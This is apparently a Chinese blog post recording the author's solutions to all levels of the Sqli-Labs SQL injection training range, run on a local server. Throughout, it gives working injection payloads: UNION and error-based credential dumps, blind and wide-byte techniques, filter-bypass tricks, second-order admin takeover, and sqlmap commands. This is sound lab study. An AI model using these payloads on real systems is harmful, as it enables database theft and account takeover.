---
title: Sqli-Labs 靶场过关记录
toc: true
categories: Tech Blog
abbrlink: e524a0b
date: 2023-08-10 21:12:27
updated: 2024-03-31 21:12:27
---

Sqli-Labs是一个颇为出名的SQL注入靶场，提供了丰富的SQL注入演习靶场
我在本地搭建的SQLInjection靶场环境为Apache2.4.39,MySQL8.0.12与PHP5.3.29nts.
[靶场仓库地址](https://github.com/Audi-1/sqli-labs)
日后有空就Fork靶场仓库，使其适配最新版PHP与MySQL并写入注释解读每一关代码并拓展关卡对应技术知识😇

>尽管 sqli-labs 的 index 页面显示它有 75 关，但无论是翻阅靶场文件还是阅读其他通关攻略，都只找得到 65 关，故 65 这个关卡数应该才是正确的 :P

## Page-1 Basic Injections

### SQL 注入漏洞的一般利用流程

以第一关为例，当我们发现攻击对象存在 SQL 注入漏洞的注入点时，常通过以下流程进行漏洞利用

假设我们通过联表查询进行数字型 SQL 注入，其中被注入语句为

```SQL
SELECT * FROM USERS WHERE ID = {USER_INPUT}
```

假设 USERS 表有 3 个字段 ，分别为 ID,USERNAME,PASSWORD ， 为达成攻击目的，常使用以下 Payload

1. 测试列数

```SQL
-1 ORDER BY 1 #
-1 ORDER BY 2 #
-1 ORDER BY 3 #
...
-1 ORDER BY N #
# 直到列数到不报错为止
```

或者

```SQL
-1 UNION SELECT 1 #
-1 UNION SELECT 1,2 #
-1 UNION SELECT 1,2,3 #

# 这样做的好处是可以确定前端输出的数据位于 SQL 语句的查询的第几位
```

1. 判断出原 SQL 语句查询的列数（根据假定情况为 3 位）后，获取库名，系统版本号

```SQL
-1 UNION SELECT 1,DATABASE(),VERSION() #
```

2. 获取当前数据库下的所有表

```SQL
-1 UNION SELECT 1,group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=DATABASE()
```

3. 获取当前指定表的所有字段

```SQL
-1 UNION SELECT 1,group_concat(column_name),2 FROM information_schema.columns WHERE table_name="USERS"
```

4.  获取指定表所有字段的值

```SQL
-1 UNION SELECT 1,group_concat(ID,USERNAME,PASSWORD),2 FROM USERS #
```

由于 Sqli-labs 靶场只需要绕过简单的 WAF 检测，不涉及其他相较而言更复杂的 Bypass ，故当关卡能够成功进行注入时以上的重复步骤不赘述

盲注关卡可使用 SQLMAP 进行自动化注入

### 第1关

根据提示GET传参id=1得到回显，传入不同值发现得到回显不同，传入 `?id=1'` 判断SQL注入类型，发现是字符型注入，注入 `?id=' ORDER BY 4;--+` 发现总共有3列，注入`?id=' union select 1,2,3; --+`发现输出时会输出第二第三列，将第二、三列替换为database()，version()得到数据库名为security,数据库版本为8.0.12。由于靶场始终位于同一环境下，不同关卡中得到的信息相同，故以上相同回显以后不再重复记录。注入`?id=-1'union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database()--+`爆表，共有emails,referers,uagents,users四张表，注入`?id=-1%27union%20select%201,group_concat(column_name),2%20from%20information_schema.columns%20where%20table_name=%27users%27--+`爆表，得到users表中有USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password六个字段,最后注入`?id=-1%27union%20select%201,group_concat(username,id,password),2%20from%20users--+`拿到所有用户的用户名与密码

### 第2关

第二关注入`?id=1'`得到报错信息，则应该是数字型注入，采用和上一关相同的注入手段即可`?id=-1%20union%20select%201,group_concat(username,id,password),2%20from%20users--+`

### 第3关

注入`?id=1'`得到报错信息，发现后端的SQL语句使用了括号包裹了用户输入，那么在第一关基础上把使用引号闭合改成使用引号和反括号闭合SQL语句即可
`?id=%27)union%20select%201,group_concat(username,id,password),2%20from%20users--+`

### 第4关

老花样注入`?id=1'`的时候没有回显，疑惑了一阵，再注入`?id=1"`发现输入被双引号包裹，故依然在前一关基础上把单引号反括号改成用双引号反括号闭合sql语句即可
`?id=%22)%20union%20select%201,group_concat(username,id,password),2%20from%20users%20--+`

### 第5关

没有回显，一般要么报错注入要么布尔注入，可以自己写脚本注入或者SQLMap一把梭 :P
`?id=1' and XXXX`
`sqlmap -u "http://localhost/sqli-labs-master/Less-5?id=1" -D security -T users --columns --batch`

### 第6关

没有回显，也是布尔注入，测试参数时不难发现第六关是第五关的双引号版
`?id=1" and XXXX`
`sqlmap -u "http://localhost/sqli-labs-master/Less-6?id=1" -D security -T users --columns --batch`

### 第7关

在第5关的基础上更进了一步，把报错信息黑箱了，注入`?id=1'`时只能知道"You have an error in your SQL syntax"而没有具体的报错，但注入`?id=1"`时却没报错，说明是单引号闭合了SQL语句，注入`?id=1'--+`依然报错，说明SQL语句没有完全闭合，尝试添加一个括号，仍然报错，有点没有头绪，看了php源代码，发现前端输入被一个单引号和两个括号包裹，因此注入时and前面的部分写成`?id=1'))`即可
`?id=1)) and XXXX`
`sqlmap -u "http://localhost/sqli-labs-master/Less-7?id=1" -D security -T users --columns --batch`
``

### 第8关

和第5关一样，只是没有了第5关的报错信息
`?id=1' and XXXX`
`sqlmap -u "http://localhost/sqli-labs-master/Less-8?id=1" -D security -T users --columns --batch`

### 第9关

无论参数怎么填页面都没有变化，应该是时间盲注，建议一把梭
`?id=1' and if(XXX,sleep(5),1)--+`
`sqlmap -u "http://localhost/sqli-labs-master/Less-9?id=1\'" -D security -T users --columns --batch`

### 第10关

第9关换成双引号即可
`?id=1" and if(XXX,sleep(5),1)--+`
`sqlmap -u "http://localhost/sqli-labs-master/Less-10?id=1\"" -D security -T users --columns --batch`

### 第11关

POST方法版的第一关，需要注意的是post方法的data数据不会被URL编码，把--=改成--(空格)即可

### 第12关

双引号加括号版的第11关

### 第13关

单引号加括号版的第11关

### 第14关

双引号版的第11关

### 第15关

没有错误信息的回显的第11关，布尔盲注即可

### 第16关

没有错误信息的回显的第12关

### 第17关

开始上强度了，看不明白这页面是干什么的，尝试各种注入点页面都没什么变化。看源代码白盒测试😈
php代码的基本功能是获取前端输入的用户名的前十五位，对这十五个字符的特殊字符进行mysql_real_escape_string转义，如果用户名存在则将用户密码更改为前端输入的密码。在判断用户名的流程中,后端语句使用了select语句，翻了翻PHP手册发现mysql_real_escape_string发现可以宽字节注入绕过,但这样注没有回显。继续看代码发现UPDATE的sql语句执行错误时会回显错误信息，判断为报错注入。password字段我们可以注入的语句为:

#### extractvalue版本

爆版本 `1' and extractvalue(1,concat(0x5c,version(),0x5c))#`

爆数据库 `1' and extractvalue(1,concat(0x5c,database(),0x5c))#`

爆表名 `1' and extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c))#`

爆字段名 `1' and extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x5c))#`

爆字段内容(该格式针对mysql数据库) `1' and extractvalue(1,concat(0x5c,(select password from (select password from users where username='admin1') b) ,0x5c))#`

爆字段内容 `1' and extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c))#`

#### updatexml版本

爆版本 `1' and updatexml(1,concat(0x5c,version(),0x5c),1)#`

爆数据库 `1' and updatexml(1,concat(0x5c,database(),0x5c),1)#`

爆表名 `1' and updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1)#`

爆字段名 `1' and updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name ='users'),0x5c),1)#`

爆密码该格式针对mysql数据库 `1' and updatexml(1,concat(0x5c,(select password from (select password from users where username='admin1') b),0x5c),1)#`

爆表 `1' and updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name ='users'),0x5c),1)#`

### 第18关

进入页面发现会显示你的ip地址，使用Dumb:Dumb成功登录后页面会回显Ip地址和User-Agent。查看源码发现本关会对username和password对进行一次包括mysql_real_escape_string函数在内的输入检测，当用户名和密码都正确时执行一个INSERT语句，将UA和IP插入到数据库中。这样的话这关有三种思路，一是采用宽字节注入等方式绕过输入检测，二是尝试利用INSERT语句写入shell，三是通过修改请求头的UA字段进行报错注入。显然这里更可能是在要求我们使用第三种方法。在进行报错注入时需要注意执行的SQL语句"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";在闭合时我们需要闭合单引号和括号，同时被闭合的内容要满足有三个参数，即`1',2,3)#`其中2和3的位置可以换成报错注入语句，例如`1',2,extractvalue(1,concat(0x5c,version(),0x5c)))#`

### 第19关

Referer字段版本的第18关

### 第20关

Cookie字段版本的第18关，将注入语句传入cookie字段的uname参数即可

### 第21关

抓包发现Cookie的uname参数值经过了base64编码，采用和第20关一样的注入方式即可。本关闭合SQL语句需要用单引号加括号

### 第22关

用双引号闭合SQL语句版的第21关

## Page-2 Advanced Injection

### 第23关

输入单引号报错，但使用--+注释符无法注入，查看源代码发现注释符发现注释符被过滤，则可以利用逻辑运算的短路特性（仔细一想感觉这一特性用不用上不是很重要），使用```or 1 = '1```闭合注入点之后的语句。以及因此不能使用```order by```语句判断表的列数。除此以外和第1关一样。
```?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 or '1'='1```

```?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' ),3 or '1'='1```

```?id=-1' union select 1,(select group_concat(password,username) from users),3 or '1'='1```

### 第24关

这次的页面有了比较大的变化。有一个登陆页面，注册页面和密码修改页面，看了看网站目录更是有八个PHP脚本。狠狠阅读PHP代码，发现网站结构还是比较简单的。核心逻辑位于login.php和login_create.php两个文件中，login.php会根据POST提交的用户名和密码进行查询,执行的SQL语句为```$sql = "SELECT * FROM users WHERE username='$username' and password='$password'";```容易想到在第一个注入点注入\，使得第一个注入点的第二个单引号被转义与第二个注入点的第一个单引号闭合，然后我们在第二个注入点进行注入即可。
草失败了，再仔细看了看源代码发现login.php使用了mysql_real_escape_string函数而login_create.php使用了mysql_escape_string函数对输入的特殊字符进行转义。首先想到login.php在以上注入的基础上使用宽字节注入有概率能够成功。继续阅读login_create.php的源代码，这个页面在对输入的用户名和密码进行mysql_escape_string过滤后会先判断用户名是否存在，如果是新用户名且初次输入和再次输入的密码相同则将用户名与密码的字段值插入到用户数据库的表中。同时另外一个pass_change.php页面可以在用户名已存在的情况下让我们更改密码。因为转义只发生在php从超全局变量中取值，而不会对SQL数据库中的值转义，因此我们可以把payload当作用户名与密码存入表中，当php程序从表中取出payload执行时实现SQL注入攻击。我们可以通过二次注入实现上面的SQL注入攻击。不过实际注入的时候发现回显只有用户名，那我们就只能干脆把username注入点之后的所有部分都注释掉来查看效果，但发现这样做仍然有问题，问题在于login_create.php在判断用户名是否存在时也会根据username进行一次查询```$sql = "select count(*) from users where username='$username'";```。而存储用户数据的表对username字段限制了长度，按照我的测试用户名最长为20个字符，而经过mysql_escape_string转移后的SQL注入语句很容易就会超过这个限制。我们能够执行的SQL注入语句有很大的限制：(。无奈，我一怒之下查了查sqli-labs的攻略，发现这一关并不像前面的关卡一样需要爆库，而是要求我们利用业务逻辑漏洞进行提权。网站的管理员用户名是admin,那我们就注册名为admin'#的用户，这样当后端从数据库中取出admin'#的被污染的账户数据时sql语句就会变为```$sql = "select count(*) from users where username='admin'#'";```，利用这一漏洞，我们先以admin'#的身份登录，再修改密码，将admin'#的密码修改为任意密码，而后端实际上会将admin账户的密码修改为我们设置的密码，从而实现提权。同样admin可以是我们已知用户名的任何一个人，从而通过二次注入对站点进行攻击。

### 第25关

一访问页面就能看到提示"All your 'OR' and 'AND' belong to us"，一试发现果然or和and被过滤掉了，不过比较难绷的是这关没有过滤注释符，那可以按照第1关的方式过关。查看源代码看看有没有什么坑，

```PHP
$id= preg_replace('/or/i',"", $id); //strip out OR (non case sensitive)
$id= preg_replace('/AND/i',"", $id);
```

发现对or和and的过滤是将他们替换为空，但是只会替换一次，那也可以使用双写绕过oorr然后按照23关的方式过关。

### 第25a关

过滤掉and和or版的第一关。

### 第26关

这一关在上一关的基础上对特殊符号进行了更彻底的过滤，空格，注释符也被过滤掉了。bing了一下尝试了是同制表符换行符换页符代替空格的进行绕过的操作，但是哪怕php脚本里并没有对这些符号进行过滤但还是失败了

``` PHP
        $id= preg_replace('/or/i',"", $id); //strip out OR (non case sensitive)
        $id= preg_replace('/and/i',"", $id);    //Strip out AND (non case sensitive)
        $id= preg_replace('/[\/\*]/',"", $id);  //strip out /*
        $id= preg_replace('/[--]/',"", $id);    //Strip out --
        $id= preg_replace('/[#]/',"", $id); //Strip out #
        $id= preg_replace('/[\s]/',"", $id);    //Strip out spaces
        $id= preg_replace('/[\/\\\\]/',"", $id);
```

不知道是为什么。令人费解，日后再查，mark一下
按道理这关可以采用的编码绕过方式有

- %09 TAB键（空格）
- %0A 新建一行（空格）
- %0C 新的一页
- %0D return即回车功能 （php-5.2.17,5.3.29成功）
- %0B TAB键（垂直）
- %A0 空格 （php-5.2.17成功）
但是失败了，再查资料发现可以采用括号绕过,比如

``` plaintext
?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security'))),1))||'0   爆表
?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema='security'aandnd(table_name='users')))),1))||'0     爆字段
?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(passwoorrd,username))from(users))),1))||'0   爆字段值
```

因为```union select```之间的空格想不到怎么用()绕过就干脆使用报错注入了。

### 第26a关

这一关一是把```print(mysql_error())```注释掉了，二是使用了单引号和括号包裹参数。按道理和上一关一样应该使用其他字符代替空格进行绕过的，然是也和上一关一样无法绕过那联表查询难以使用。MysqlError回显也没有报错注入也失效了🤔。所幸的是我们能够得知语句执行的正确与否，也就是说这一关应该采用bool注入的方式判断注入结果，但是怎么绕过blacklist呢🤔
😫😵🔫

### 第27关

在26关的基础上过滤了union和select关键字，但没过滤and和or关键字，进一步查看源代码发现

```PHP
    $id= preg_replace('/[\/\*]/',"", $id);//strip out /*
    $id= preg_replace('/[--]/',"", $id);//Strip out --.
    $id= preg_replace('/[#]/',"", $id);//Strip out #.
    $id= preg_replace('/[ +]/',"", $id);//Strip out spaces.
    $id= preg_replace('/select/m',"", $id);//Strip out spaces.
    $id= preg_replace('/[ +]/',"", $id);//Strip out spaces.
    $id= preg_replace('/union/s',"", $id);//Strip out union
    $id= preg_replace('/select/s',"", $id);//Strip out select
    $id= preg_replace('/UNION/s',"", $id);//Strip out UNION
    $id= preg_replace('/SELECT/s',"", $id);//Strip out SELECT
    $id= preg_replace('/Union/s',"", $id);//Strip out Union
    $id= preg_replace('/Select/s',"", $id);//Strip out select
```

过滤了空格，和区分了大小写的select和union关键字，且select过滤了两次，那我们可以采用union双写，select三写或者union与select混合大小写的方式绕过针对union和select关键字的过滤，然后和第26关使用一样的方式进行注入即可

```plaintext
?id=1'or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(table_name))from(information_schema.tables)where(table_schema='security'))),1))or'0  爆表
?id=1'or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(column_name))from(information_schema.columns)where(table_schema='security'and(table_name='users')))),1))or'0  爆字段
?id=1'or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(password,username))from(users))),1))or'0  爆字段值
```

### 第27a关

使用了双引号且关掉了回显的第27关，和26a关类似😈

### 第28关

byd突然可以使用%0A代替空格了这是为什么呢🤔
不断fuzz发现本关过滤了"union select"这样一个关键字组合，双写这个关键字组合便可绕过，阅读源代码发现输入被单引号和括号包裹，按照第26关的注入方式注入即可。本关POC如下

```?id=')%0Aunionunion%0Aselect%0Aselect%0A1,2,3%0Aor%0A('```

### 第28a关

青春版第28关，blacklist变为只过滤"union select"关键字组合，直接套用第28关payload即可

### 第29关

注入?id=1'得到回显发现是字符型注入点，注入?id=' union select 1,2,3 and 1='1成功，进一步注入```' union select 1,group_concat(password,'%20 ',username),3 from users --+```直接秒了🤔。
翻了翻根目录打算看源代码的时候发现原来还有两个页面，一个login.php,一个hacked.php,返回页面接着注😈
输入?id=1成功访问，id=1'时页面跳转到了hacked.php,被WAF抓到了😈果断查看源代码研究WAF是如何运作的。
在login.php中，发现后端会对输入的参数值进行正则匹配，正则表达式为```^\d+$```,即只能输入数字。但是有一个奇怪的语句```whitelist($id1);```这似乎是在暗示我们参数不止一个，否则没有必要标出1这个值。经过一些搜索和php程序编写的验证，发现对于```$id=$_GET['id]```,如果我们在传参的时候采用了```?id=value1&id=value2....```，即对同一参数重复传参，id变量获取到的是最后一个value值。而用于whitelist函数检验的id1变量只会是第一个参数值。因此本关的绕过思路应该是第一个id参数传正常数字，然后在第二个id参数中写入sql语句
```?id=1&id=-1 union select 1,group_concat(password,'%20',username),3 from users --+```

### 第30关

双引号版的第29关

### 第31关

双引号加括号版的第29关

### 第32关

看了看关卡名和页面给出了输入的参数值的十六进制回显一眼就能看出这是宽字节注入，在引号前加个%df速通

```?id=-1%df%27%20union%20select%201,group_concat(password,username),3%20from%20users--+```

### 第33关

怪了，和32关一样，作者手抖了？

### 第34关

很奇怪，看起来感觉就是post型的sql注入，但是回显显示%df字符没有被url解码而是直接传进了SQL语句，导致宽字节注入没有成功，太抽象了。而33，32关GET方法传入的%df就被正确的urldecode了。然后在我自己写的post回显验证程序中对post参数值的urldecode又是正常的🤔。这样的话尝试使用%df代表的明文字符或者使用它的其他编码应该能行。绷不住了。二刷做Page4时再尝试解决此问题。如果没出这个问题的话本题在username一栏注入```%df' union select 1,group_concat(password,username) from users  #```即可

### 第35关

对id参数值进行addslash处理的第一关。由于是数值型注入，addslash对我们造成的阻碍主要体现在爆表的时候where table_name='tablename'上，不过此处的tablename可以使用不需要使用引号的十六进制编码表示，然后按照第一关步骤来即可

### 第36关

使用mysql_real_escape_string函数代替addslash函数版的第32关，由于针对特殊字符的转义操作一样，谷可以直接套用32关的payload

### 第37关

mysql_real_escape_string函数版本的第34关

## Page-3 Stacked Injections

### 第38关

可以直接按照第1关的方式过关。同时由于后端使用了支持执行多条sql语句的mysqli_multi_query函数，我们也可以堆叠注入在闭合引号后加上分号，然后进行自己想要做的sql操作，例如修改admin密码或者插入自己的账户等。

### 第39关

整数注入点版的38关

### 第40关

单引号加括号进行闭合版的第38关

### 第41关

关掉了回显的第39关

### 第42关

本关首页是一个登录页面，点击登录以外的能够交互的ForgotYourPassword和NewUer链接都只会得到包含了YouNeedToHackIn这样一句话的页面。使用在前面的关卡就已经知道了的Dumb:Dumb可以成功登录，登陆后会得到一个密码修改页面，输入原密码和新密码对密码进行修改，以及logout按钮。回到登陆页面，分别对username和passowrd参数进行注入。username字段fuzz无回显，password字段有回显，发现password注入点被双引号包裹。尝试进行报错注入```1" and extractvalue(1,concat(0x7e,(select group_concat(password,0x7e,username)from(users)))) #```，失败，怒而查看源代码,怎么是单引号包裹的输入🤔,再次注入```1' and extractvalue(1,concat(0x7e,(select group_concat(password,0x7e,username)from(users)))) #```注入成功。再看源代码，发现漏洞原因是只对账户名进行了转义,而数据库并未采用GBK编码，故无法使用宽字节注入username字段。不过我们可以在密码参数中进行sql注入。而如果要用堆叠注入进行攻击，也是在密码参数处进行堆叠注入即可，比如插入一组账户密码使自己能够登录，不过刚刚试了一下因为后端是只要select语句返回不为空即可登录，那完全可以注入```1' or 1=1 #```这样类似的万能密码进行登录，堆叠注入又有些多此一举了🤔

### 第43关

单引号加括号包裹参数版的第42关

### 第44关

没有回显的第42关

### 第45关

没有回显的第43关

### 第46关

按照页面信息对sort参数传入数值，发现给出了users表，分别传入1,2,3发现表中字段的顺序发生了改变。不难猜到传入的sort参数值会作为是ORDER BY语句的参数,因此我们无法使用联表注入,尝试输入错误数值发现有回显，直接报错注入```extractvalue(1,concat(0x7e,(select(group_concat(database(),0x7e,user())))))```即可

### 第47关

输入被单引号包裹版的第46关

### 第48关

没有回显，按照关卡规律猜测是没有回显版的第46关，sqlpmap时间盲注一把梭
```sqlmap -u "http://localhost/sqli-labs-master/Less-48/?sort=3" -D security -T users -C password,username --dump --batch```

### 第49关

没有回显版的第47关

### 第50关

mysqli_multi_query函数版的第46关

### 第51关

mysqli_multi_query函数版的第47关

### 第52关

mysqli_multi_query函数版的第48关

### 第53关

mysqli_multi_query函数版的第49关

## Page-4 Challenges

### 第54关

与第 1 关一致，唯一的限制注入次数不得超过十次，否则会重置数据库信息

### 第55关

使用括号闭合的第54关

### 第56关

使用单引号和括号闭合的第54关

### 第57关

使用双引号闭合的第54关

### 第58关

需要在 5 次注入内拿下版本的第 17 关

> 想 union 注入却死活没注出来，查看源码后发现对应逻辑为
>
> ```PHP
>            $sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1";
>            $result=mysql_query($sql);
>            $row = mysql_fetch_array($result);
>
>            if($row)
>            {
>                echo '<font color= "#00FFFF">';    
>                $unames=array("Dumb","Angelina","Dummy","secure","stupid","superman","batman","admin","admin1",">admin2","admin3","dhakkan","admin4");
>                $pass = array_reverse($unames);
>                echo 'Your Login name : '. $unames[$row['id']];
>                echo "<br>";
>                echo 'Your Password : ' .$pass[$row['id']];
>                echo "</font>";
>            }
>            else 
>            {
>                echo '<font color= "#FFFF00">';
>                print_r(mysql_error());
>                echo "</font>";  
>            }
>
> ```
>
> 故只能通过报错注入通过本关

### 第59关

数字型注入点的第 58 关

### 第60关

双引号加括号闭合注入点的第 58 关

### 第61关

单引号加双括号闭合注入点的第 58 关

### 第62关

看到 130 次注入次数上限不难猜到应该是布尔注入。

使用 payload `http://localhost/sqli-labs-master/Less-62/index.php?id=1')%20and%20sleep(5)%20--+`可以判断出注入点使用单引号与括号闭合

SQLMAP 一把梭就行

### 第63关

使用单引号闭合的第 62 关

### 第64关

使用双括号闭合的第 62 关

### 第65关

使用括号闭合的第 62 关

## Reference

这些是我在遇到问题和通关后用于对比的其他作者写的通关攻略

[攻略1](https://blog.csdn.net/dreamthe/article/details/123795302)
[攻略2](https://cloud.tencent.com/developer/article/1777619?areaId=106001)
